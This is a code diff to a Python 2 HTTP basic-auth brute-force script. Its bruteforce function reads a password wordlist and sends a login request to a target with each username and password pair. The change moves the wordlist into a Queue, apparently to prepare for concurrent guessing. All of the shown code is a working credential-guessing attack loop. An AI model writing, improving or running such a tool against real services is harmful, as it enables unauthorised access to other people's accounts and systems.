@@ -5,6 +5,7 @@
 import requests
 import sys
 import argparse
+import Queue
 from termcolor import colored
 
 __AUTOR__   =   'Matheus Fidelis'
@@ -38,13 +39,22 @@ def bruteforce(target,passlist,username):
     #Abre a passlist
     fd = open(passlist, 'rw')
     passwords = fd.readlines()
+    passes = Queue.Queue()
+
+    for password in passwords:
+        password = password.rstrip()
+        passes.put(password)
+
     i = 0
     print ""
     print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
     print ""
-    for password in passwords:
+
+    while not passes.empty():
+        password = passes.get()
+
         i = i + 1
-        password = password.rstrip()
+
         test = requests.get('http://'+target, auth=(username, password))
         code = test.status_code
         print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
